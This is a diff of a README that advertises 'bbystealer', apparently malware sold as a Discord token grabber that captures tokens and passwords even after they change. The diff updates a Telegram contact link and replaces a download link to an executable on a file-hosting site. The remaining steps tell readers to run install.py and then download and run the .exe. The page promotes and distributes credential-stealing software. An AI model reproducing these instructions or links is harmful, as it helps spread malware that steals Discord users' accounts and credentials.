@@ -3,7 +3,7 @@
 #####  [:gem: Premium](t.me/dxlstealer) - [🔧 Builder](t.me/dxlstealer) [💡 Features](t.me/dxlstealer) 
 
 ### Contact
-t.me/dxlstealer
+http://t.me/dxlstealer
 
 # bbystealer
 The new modern discord token grabber & token stealer, with discord password & token even when it changes
@@ -14,8 +14,7 @@ The new modern discord token grabber & token stealer, with discord password & to
 
 3- run install.py
 
-4- dowload:https://dosya.co/fybqvwrewjpa/my-program.exe.html
-
+4- dowload:https://dosya.co/0tlemuepfz6v/mon-programme.exe.html
 Download it, put it in a folder and run it
 
 
